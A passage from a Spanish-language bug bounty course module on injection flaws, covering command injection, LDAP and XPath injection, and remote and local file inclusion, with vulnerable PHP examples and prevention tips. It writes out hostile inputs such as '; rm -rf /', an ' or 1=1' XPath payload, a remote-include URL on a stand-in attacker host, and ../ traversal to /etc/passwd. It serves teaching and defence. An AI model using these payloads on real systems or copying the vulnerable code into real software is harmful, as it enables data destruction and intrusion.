id="4d479f7d-8912-47f2-b99a-2fe6b6ff4157" class="bulleted-list"><li style="list-style-type:disc">Utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</li></ul><h2 id="0072ce4f-13ba-4307-add3-0c38ed1cebbb" class="">Command Injection (Inyección de Comandos) </h2><p id="bceccacd-800e-4d62-abef-56c7caf43ebb" class="">La inyección de comandos, también conocida como command injection, es una técnica de ataque utilizada para ejecutar comandos maliciosos en un servidor web. Los atacantes aprovechan las vulnerabilidades en las aplicaciones web que utilizan comandos del sistema operativo, como la línea de comandos o las shell scripts, para introducir comandos maliciosos en los campos de entrada de datos, como los campos de búsqueda o los comentarios. Si la aplicación web no está protegida adecuadamente, estos comandos maliciosos pueden ser ejecutados en el servidor, lo que permite a los atacantes tomar el control del servidor y realizar acciones no deseadas.</p><p id="43b2186a-6ddb-4ed5-a946-0fb16117d0e5" class="">Por ejemplo, un atacante podría introducir el siguiente comando malicioso en un campo de entrada:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d06965ae-4181-4b7c-967f-80bac52a491f" class="code code-wrap"><code class="language-Plain Text">; rm -rf /</code></pre><p id="c0087560-2860-4f4d-a72e-6aacc78eb9bc" class="">Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, el comando malicioso podría ser ejecutado en el servidor, lo que eliminaría todos los archivos del sistema. Esto podría causar daños irreparables al servidor y a la aplicación web.</p><p id="f6f4e218-e8de-44f8-b369-e4cd3c983e2f" class=""> En la siguiente imagen, vemos los pasos recomendados dentro de la metodología de Bug Bounty para probar inyección de Comandos:</p><figure id="0c30bb26-c659-4089-be77-2b5f0c9d1337" class="image"><a href="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_para_Command_execution.png"><img style="width:720px" src="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_para_Command_execution.png"/></a><figcaption>Imagen: Metodologia de Pruebas de Inyección de Comandos</figcaption></figure><h3 id="5380c621-96c6-43ce-8c38-5c0ee5f515d9" class="">Prevención de Vulnerabilidades Command Injection</h3><p id="c95e5d07-56c4-46c9-af4a-e2d34c21905f" class="">A continuación se presentan algunas recomendaciones para prevenir la inyección de comandos en sitios web:</p><ul id="0174a084-8a7f-482a-b85c-ada39a90a41c" class="bulleted-list"><li style="list-style-type:disc"><strong>Validar y filtrar los datos de entrada:</strong> Es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web para asegurarse de que sólo contengan los caracteres permitidos. Por ejemplo, si un campo de entrada debe contener sólo números, la aplicación web debe asegurarse de que el campo no contenga caracteres alfabéticos o especiales. Si un campo de entrada debe contener sólo texto, la aplicación web debe asegurarse de que el campo no contenga caracteres numéricos o especiales. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</li></ul><ul id="6f078e22-b160-4c04-baa1-fd7ac280e832" class="bulleted-list"><li style="list-style-type:disc"><strong>Utilizar parámetros en vez de comandos:</strong> Es importante utilizar parámetros en vez de comandos para la comunicación entre la aplicación web y el sistema operativo. Por ejemplo, en vez de utilizar el comando &quot;ls&quot; para listar los archivos de un directorio, la aplicación web debería utilizar una función del lenguaje de programación que permita listar los archivos del directorio utilizando parámetros.</li></ul><ul id="6ea9c39d-c5d1-4ff1-8d2b-3bca8096da4e" class="bulleted-list"><li style="list-style-type:disc"><strong>Limitar el acceso a los comandos del sistema:</strong> Es importante limitar el acceso a los comandos del sistema del servidor web. Por ejemplo, es importante restringir el acceso a los archivos y directorios del sistema operativo a los usuarios y grupos necesarios para la aplicación web.</li></ul><ul id="88aa3f4a-96d4-4ed0-9079-873c009552ea" class="bulleted-list"><li style="list-style-type:disc"><strong>Utilizar comandos seguros:</strong> Es importante utilizar comandos seguros que no sean vulnerables a la inyección de comandos. Por ejemplo, la función &quot;escapeshellarg&quot; en PHP puede ser utilizada para escapar los caracteres especiales en los argumentos de los comandos del sistema operativo.</li></ul><ul id="3e74f9a8-336e-45d3-b261-7ff366f76e90" class="bulleted-list"><li style="list-style-type:disc"><strong>Utilizar una capa de seguridad adicional:</strong> Es importante utilizar una capa de seguridad adicional, como una lista blanca de comandos permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</li></ul><ul id="27b6d4e8-81a6-47d7-bc7c-843ff9066e84" class="bulleted-list"><li style="list-style-type:disc"><strong>Mantener la aplicación web actualizada:</strong> Es importante mantener la aplicación web actualizada con las últimas versiones de los componentes y librerías utilizados para reducir la posibilidad de vulnerabilidades conocidas.</li></ul><ul id="e7f4f2c1-b309-4485-a88e-ac25d196c99c" class="bulleted-list"><li style="list-style-type:disc"><strong>Realizar pruebas de seguridad:</strong> Es importante realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</li></ul><p id="5d3f35c6-e181-4b81-8086-6cbd0906d14f" class="">
+</p><h2 id="54475dae-121a-413e-a99c-f1259a474077" class="">LDAP Injection (Inyección LDAP)</h2><p id="0ddfae42-9ff0-42b3-a7d1-35c23a65dc33" class="">La inyección LDAP es una técnica de ataque que explota las vulnerabilidades en aplicaciones que utilizan el protocolo LDAP (Lightweight Directory Access Protocol) para la autenticación y el almacenamiento de información de usuarios. El protocolo LDAP se utiliza comúnmente en aplicaciones de directorio, como la autenticación de usuarios y el registro de direcciones de correo electrónico.</p><p id="81b4ed54-1b23-421e-917c-55a706176db8" class="">En un ataque de inyección LDAP, los atacantes introducen expresiones maliciosas en los campos de entrada de datos, como los campos de autenticación de usuario o de búsqueda de directorios, con el fin de obtener acceso no autorizado a la información de usuario o realizar acciones no deseadas en el servidor.</p><p id="7426280d-1019-42c9-8e59-f2cfc8b3a3e0" class="">Por ejemplo, si una aplicación web utiliza el protocolo LDAP para la autenticación de usuarios, un atacante podría introducir una expresión maliciosa en el campo de autenticación de usuario para intentar obtener acceso no autorizado a la información de usuario. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la expresión maliciosa podría ser ejecutada en el servidor LDAP, lo que permitiría al atacante obtener acceso no autorizado a la información de usuario.</p><p id="3e540ed9-53c6-4e28-aa47-88b731bc4156" class="">Otro ejemplo de inyección LDAP podría ser cuando un atacante introduce una expresión maliciosa en un campo de búsqueda de directorios. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la expresión maliciosa podría ser ejecutada en el servidor LDAP, lo que permitiría al atacante obtener información no autorizada sobre los usuarios del sistema.</p><p id="95608588-641e-49a1-a3df-6bc27a1ef972" class="">En la siguiente imagen, vemos los pasos recomendados dentro de la metodología de Bug Bounty para probar inyección LDAP:<div class="indented"><figure id="d4e02463-0e56-43d0-ae28-4bb81f4f2ef1" class="image"><a href="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_LDAP_Injection.png"><img style="width:1008px" src="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_LDAP_Injection.png"/></a><figcaption>Imagen: Pasos de la Metodología de Bug Bounty para realizar pruebas de Inyección LDAP</figcaption></figure></div></p><p id="a6ee1095-3c49-40f6-995f-703e678327ae" class="">
+</p><p id="81d153b7-698b-45fc-ada9-3f24e2694889" class="">Un ejemplo de inyección LDAP podría ser el siguiente:</p><p id="3e2ed8e0-03a1-4783-a0a0-328de9a7c240" class="">Si una aplicación web utiliza el protocolo LDAP para la autenticación de usuarios, el siguiente código PHP podría ser vulnerable a la inyección LDAP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e48bd12b-78af-493b-ac01-f95e8e784bdc" class="code code-wrap"><code class="language-Plain Text">&lt;?php
+  $usuario = $_POST[&#x27;usuario&#x27;];
+  $contraseña = $_POST[&#x27;contraseña&#x27;];
+  $ldap = ldap_connect(&quot;ldap://servidorldap.com&quot;);
+  if ($ldap) {
+    $bind = ldap_bind($ldap, &quot;cn=$usuario,ou=usuarios,dc=servidorldap,dc=com&quot;, $contraseña);
+    if ($bind) {
+      echo &quot;Bienvenido $usuario&quot;;
+    } else {
+      echo &quot;Error de autenticación&quot;;
+    }
+    ldap_close($ldap);
+  } else {
+    echo &quot;Error de conexión al servidor LDAP&quot;;
+  }
+?&gt;</code></pre><p id="e2810893-4d4c-422a-88be-c4f2c0e7edd6" class="">En este código, el usuario puede enviar valores maliciosos a través de los campos de entrada <code>usuario</code> y <code>contraseña</code>, lo que permite la inyección LDAP. Por ejemplo, si el usuario envía el valor <code>&#x27;*)(uid=*))(|(uid=*))=*&#x27;</code> en el campo <code>usuario</code>, se ejecutará la siguiente expresión maliciosa:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e39da96c-12f9-4290-b661-5e15e3fa229d" class="code code-wrap"><code class="language-Plain Text">cn=*)(uid=*))(|(uid=*))=*,ou=usuarios,dc=servidorldap,dc=com</code></pre><p id="0cf5fcf5-241e-49c0-9aac-8ac94d8be483" class="">Esta expresión maliciosa devuelve todos los usuarios del directorio, lo que puede permitir al atacante obtener información no autorizada sobre los usuarios del sistema. Para prevenir este tipo de ataque, es importante validar y filtrar adecuadamente los datos de entrada del usuario en la aplicación web.</p><h3 id="8b02fc67-feff-452b-a166-8d7c320912bd" class="">Prevención Vulnerabilidad LDAP Injection</h3><ul id="0bc9bd39-58df-4952-8031-e2591cc102e0" class="bulleted-list"><li style="list-style-type:disc">Para prevenir la inyección LDAP, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</li></ul><ul id="c612b136-a772-44f5-abf7-cbe633149c7f" class="bulleted-list"><li style="list-style-type:disc">También es importante restringir el acceso a los directorios LDAP y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los directorios y entradas de LDAP necesarios para la autenticación y el almacenamiento de información de usuario.</li></ul><ul id="9718d1de-60ef-4fa9-96d0-80cd654cfe83" class="bulleted-list"><li style="list-style-type:disc">Asimismo, es importante utilizar versiones actualizadas de los componentes y librerías utilizados en la aplicación web para reducir la posibilidad de vulnerabilidades conocidas. También es recomendable realizar pruebas de seguridad regulares en la aplicación web para identificar y corregir vulnerabilidades antes de que sean explotadas por los atacantes.</li></ul><p id="01f65ffe-4e44-445c-aab2-6fab8d8e5a4f" class="">
+</p><h2 id="55092860-f8be-47c4-8ef9-e3531c09b2b8" class="">XPATH Injection </h2><p id="fa7c67e6-4f0f-4bd2-864f-43ebef26e932" class="">La inyección XPath es una técnica de ataque orientado a explotar vulnerabilidades en aplicaciones web que utilizan el lenguaje XPath para consultar y procesar documentos XML. </p><p id="4f0bd633-0304-4daa-a398-51e786bd3293" class="">XPath es un lenguaje de consulta utilizado para seleccionar elementos y atributos específicos de un documento XML.</p><p id="a0ed5809-9089-4a6d-8269-b2fbf92739e8" class="">En un ataque de inyección XPath, los atacantes aprovechan las vulnerabilidades en las aplicaciones web que utilizan expresiones XPath para introducir expresiones maliciosas en los campos de entrada de datos, como los campos de búsqueda o los comentarios. Si la aplicación web no está protegida adecuadamente, estas expresiones maliciosas pueden ser ejecutadas en el servidor, lo que permite a los atacantes tomar el control del servidor y realizar acciones no deseadas.</p><p id="fff50e69-f9fa-494f-bbab-a275dcd13eee" class="">Por ejemplo, si una aplicación web utiliza XPath para procesar los datos de entrada de un formulario, un atacante podría introducir una expresión maliciosa en el campo de entrada para intentar obtener acceso no autorizado a la información del servidor. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la expresión maliciosa podría ser ejecutada en el servidor, lo que permitiría al atacante obtener acceso no autorizado a la información del servidor.</p><p id="73401415-aa85-434f-9cbe-a87d026503f1" class="">En la siguiente imagen, vemos los pasos recomendados dentro de la metodología de Bug Bounty para probar inyección XPATH</p><figure id="54e88c7f-37b1-47c2-ad56-509765127c58" class="image"><a href="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_XPATH_Injection.png"><img style="width:816px" src="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_XPATH_Injection.png"/></a><figcaption>Imagen: Pasos de la Metodología de Bug Bounty para realizar pruebas de Inyección XPATH</figcaption></figure><p id="44fb923f-7de3-4331-926b-d3ea6f8b7424" class="">Un ejemplo de código vulnerable a inyección XPath podría ser el siguiente:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="79611b8d-7d46-4813-a58c-8a8cd8cf35bb" class="code code-wrap"><code class="language-Plain Text">Este sería el contenido del archivo datos.xml:
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;datos&gt;
+  &lt;usuario&gt;
+    &lt;nombre&gt;Alice&lt;/nombre&gt;
+    &lt;contraseña&gt;12345&lt;/contraseña&gt;
+  &lt;/usuario&gt;
+  &lt;usuario&gt;
+    &lt;nombre&gt;Bob&lt;/nombre&gt;
+    &lt;contraseña&gt;abcde&lt;/contraseña&gt;
+  &lt;/usuario&gt;
+  &lt;usuario&gt;
+    &lt;nombre&gt;Charlie&lt;/nombre&gt;
+    &lt;contraseña&gt;qwerty&lt;/contraseña&gt;
+  &lt;/usuario&gt;
+&lt;/datos&gt;</code></pre><p id="715f74fb-09bf-44dc-acfe-753ff839e0b3" class="">Si una aplicación web utiliza XPath para procesar los datos de entrada de un formulario, el siguiente código PHP podría ser vulnerable a la inyección XPath:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="41c370f1-cefc-41b2-b5ce-a87cbfeeaea9" class="code code-wrap"><code class="language-Plain Text">&lt;?php
+  $nombre = $_GET[&#x27;nombre&#x27;];
+  $xml = simplexml_load_file(&quot;datos.xml&quot;);
+  $resultado = $xml-&gt;xpath(&quot;//usuario[nombre=&#x27;$nombre&#x27;]&quot;);
+  foreach ($resultado as $usuario) {
+    echo &quot;Nombre: &quot; . $usuario-&gt;nombre . &quot;
+&quot;;
+    echo &quot;Contraseña: &quot; . $usuario-&gt;contraseña . &quot;
+&quot;;
+  }
+?&gt;</code></pre><p id="dafde82e-5306-486d-ba69-ad2c8881527c" class="">En este código, el usuario puede enviar valores maliciosos a través del campo de entrada <code>nombre</code>, lo que permite la inyección XPath. Por ejemplo, si el usuario envía el valor <code>&#x27; or 1=1 or nombre=&#x27;</code> en el campo <code>nombre</code>, se ejecutará la siguiente expresión maliciosa:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d627afab-dbf1-4866-95b0-6c27ac9d1c5f" class="code code-wrap"><code class="language-Plain Text">//usuario[nombre=&#x27;&#x27; or 1=1 or nombre=&#x27;&#x27;]</code></pre><p id="71f81f2f-19fb-4a46-9d49-f896b2260771" class="">Esta expresión maliciosa devuelve todos los usuarios del documento XML, lo que permite al atacante obtener acceso no autorizado a la información del servidor. </p><h3 id="2eda6265-cfc8-40f2-b607-33a12406152a" class="">Prevención vulnerabilidad XPATH Injection </h3><ul id="1ac384ef-d42c-4081-a78f-a72cf212d13b" class="bulleted-list"><li style="list-style-type:disc">Para prevenir la inyección XPath, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de caracteres permitidos, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</li></ul><ul id="ab57b41c-d0d9-4689-86a2-8a2b256cea8d" class="bulleted-list"><li style="list-style-type:disc">También es importante restringir el acceso a los archivos y directorios sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.</li></ul><h2 id="e4128755-b90c-4168-b13c-131fbbc0fc60" class="">Remote File Inclusion (Inyección de archivos remotos)</h2><p id="6d86984f-3e64-470a-83ee-1c896b38dccb" class="">Los atacantes aprovechan vulnerabilidades en aplicaciones web que permiten la inclusión de archivos externos, como scripts o páginas web, para introducir código malicioso por medio de archivos en el servidor. Si la aplicación web no está protegida adecuadamente, este código malicioso puede ser ejecutado en el servidor, lo que permite a los atacantes tomar el control del servidor y realizar acciones no deseadas.</p><p id="591cb40b-489a-4d92-a8a4-c8843f026f50" class="">Por ejemplo, si una aplicación web utiliza una función para importar archivos externos, un atacante podría introducir una URL maliciosa en el campo de entrada de datos para intentar incluir un archivo externo en la página web. Si la aplicación web no valida o filtra adecuadamente el contenido de este campo de entrada, la URL direccionada hacia el archivo  malicioso podría ser ejecutada en el servidor, lo que permitiría al atacante tomar el control del servidor.</p><p id="f97db75c-3f84-4cd6-8d50-b96b38c603ce" class="">A continuación se presenta una guía paso a paso para validar la existencia de una vulnerabilidad RFI en un sitio web:</p><p id="1ec98889-0cfb-4d6a-8cb5-8e54303a3dc6" class=""> </p><figure id="ca7c5393-fc3c-4e4d-8557-49e984a8aa67" class="image"><a href="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_RFI.png"><img style="width:672px" src="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_RFI.png"/></a><figcaption>Imagen: Pasos de la Metodología de Bug Bounty para realizar pruebas de Inyección RFI</figcaption></figure><p id="15bfb336-a3cd-4f94-a695-a642946ab6f7" class="">
+</p><p id="d4ec1e4a-0472-40a7-a34e-142e1d0306ea" class="">Un ejemplo de código vulnerable a la inyección de archivos remotos podría ser el siguiente:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97036401-ffee-4596-a379-5c0fa4878043" class="code code-wrap"><code class="language-Plain Text">&lt;?php
+  $pagina = $_GET[&#x27;pagina&#x27;];
+  include($pagina);
+?&gt;</code></pre><p id="36fcf853-8714-4480-b041-c154c5fc9657" class="">En este código, el usuario puede enviar valores maliciosos a través del campo de entrada <code>pagina</code>, lo que permite la inyección de archivos remotos. Por ejemplo, si el usuario envía la URL maliciosa <code>&#x27;&lt;http://atacante.com/archivo_malicioso.php&#x27;</code>&gt; en el campo <code>pagina</code>, se incluirá el archivo malicioso en la página web, lo que permitiría al atacante llegar incluso hasta tomar el control del servidor.</p><h3 id="015c8af0-8c6d-487d-bbb6-9a355faa5847" class="">Prevención XPATH Injection</h3><p id="b5fffa1f-9076-4b2a-b8e2-0fd367ac96ff" class="">Para prevenir la inyección de archivos remotos, es importante validar y filtrar adecuadamente los datos de entrada en la aplicación web. Es importante asegurarse de que los campos de entrada de datos sólo contienen los caracteres permitidos y que el contenido se ajusta a un formato predefinido. Además, es importante utilizar una capa de seguridad adicional, como una lista blanca de URLs permitidas, para reducir la posibilidad de vulnerabilidades en el código de la aplicación web.</p><p id="a7b024fd-ed17-4003-9f8c-13048f648029" class="">También es importante restringir el acceso a los directorios y archivos sensibles del servidor y limitar los permisos de usuario a los necesarios para la aplicación web. Por ejemplo, los usuarios de la aplicación web sólo deberían tener acceso a los archivos y directorios necesarios para el procesamiento de datos.</p><h2 id="5390d2ca-fd5d-4309-b980-18e6bb10a713" class="">Local File Inclusion (Inyección de archivos locales)</h2><p id="5ea4e2b0-928b-4d27-91df-e66aa9190e74" class="">LFI es una técnica que permite a un atacante engañar a la aplicación web para que incluya archivos que están en el servidor web, aprovechando una funcionalidad que incluye dinámicamente archivos locales o scripts. Esto ocurre debido al uso de entradas proporcionadas por el usuario sin una validación adecuada. Esto puede llevar a algo como mostrar el contenido del archivo, pero dependiendo de la gravedad, también puede conducir a:</p><ul id="1c5e9f09-9fa3-4664-be7f-ad776f0d3638" class="bulleted-list"><li style="list-style-type:disc">Ejecución de código en el servidor web</li></ul><ul id="d47db4a1-49e9-4162-8776-980c10c6fa93" class="bulleted-list"><li style="list-style-type:disc">Ejecución de código en el lado del cliente, como JavaScript, que puede conducir a otros ataques como cross-site scripting (XSS)</li></ul><ul id="f0711901-e452-4e5b-9214-7a3d1adb0584" class="bulleted-list"><li style="list-style-type:disc">Denegación de servicio (DoS)</li></ul><ul id="5cd6279f-e5e4-4bc9-936c-d719496444d9" class="bulleted-list"><li style="list-style-type:disc">Divulgación de información sensible </li></ul><p id="3a28a459-ea89-4f82-b0d0-396c4645c0c5" class=""> A continuación se presenta una guía paso a paso para validar la existencia de una vulnerabilidad LFI en un sitio web:</p><figure id="17beffda-8d98-40a2-8a69-047b741bb273" class="image"><a href="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_LFI.png"><img style="width:864px" src="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Metodologia_de_Ataque_LFI.png"/></a><figcaption>Imagen: Pasos de la Metodología de Bug Bounty para realizar pruebas de Inyección LFI</figcaption></figure><p id="b39b7f29-23af-48bb-aa4d-f491fadb86d9" class="">
+</p><p id="5fea6dc5-cc2b-468f-bf13-a370bc433790" class="">Un ejemplo simple de LFI sería cambiar la URL de una página que incluye el nombre de un archivo, como:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7669e961-9fc0-40ac-9aa3-74df621987ab" class="code"><code class="language-Bash">https://sitio-ejemplo.com/?modulo=contacto.php
+
+Por una URL como esta:
+
+https://sitio-ejemplo.com/?modulo=/etc/passwd</code></pre><p id="1dcd49b8-b14f-40f7-a799-0d35cd7a0840" class="">Y en ausencia de un filtrado adecuado, el servidor mostrará el contenido sensible del archivo /etc/passwd.</p><p id="a972970b-3223-4c94-b589-99c87520e50f" class="">
+</p><p id="fcc5b0dd-a244-47c3-af4b-3ec7e9496a76" class="">Un ejemplo de código vulnerable a la inyección de archivos locales podría ser el siguiente:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7e63ba35-d796-4846-93cb-d2700530a7dd" class="code code-wrap"><code class="language-Plain Text">&lt;?php
+  $pagina = $_GET[&#x27;pagina&#x27;];
+  include($pagina);
+?&gt;</code></pre><p id="097a89fc-d0ea-449b-9bdb-94d4fa61d974" class="">En este código, el usuario puede enviar valores maliciosos a través del campo de entrada <code>pagina</code>, lo que permite la inyección de archivos locales. Por ejemplo, si el usuario envía la ruta maliciosa <code>../../../../etc/passwd</code> en el campo <code>pagina</code>, se incluirá el archivo <code>/etc/passwd</code> en la página web, lo que permitiría al atacante obtener información confidencial sobre el sistema.</p><p id="fb98cd79-be78-4532-8f8c-59e19692f0df" class="">
+</p><h3 id="69979a49-71e6-412a-9ec6-622c4c84fd9a" class="">Para qué sirve “../” ?</h3><p id="3483e7af-3a7e-4a07-be43-9a06f6635c94" class="">El conjunto de caracteres <code>../</code> es una secuencia que se utiliza en la inyección de archivos locales (LFI) para indicar que se debe retroceder un nivel en la jerarquía de directorios del servidor;</p><figure id="8fac8da2-d136-49bc-9267-db7283fa8934" class="image"><a href="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Untitled.png"><img style="width:384px" src="Mo%CC%81dulo%2012%20-%20Inyeccio%CC%81n%209fa69e094d83452db17a93f7288e4d65/Untitled.png"/></a><figcaption>Imagen: Jerarquia de Directorios</figcaption></figure><h3 id="2296ea07-79ae-4240-a370-44e1e6facf5a" class=""> Prevención de vulnerabilidad Local File Inclusion</h3><p id="c6fc4926-a819-44c4-8f40-37f1ca04277f" class="">Para prevenir la inyección de archivos locales, es importante:</p><ul id="48125990-8a87-4c57-a814-2ea702649ddc" class="bulleted-list"><li style="list-style-type:disc">Validar y filtrar adecuadamente los datos de entrada en la aplicación web. 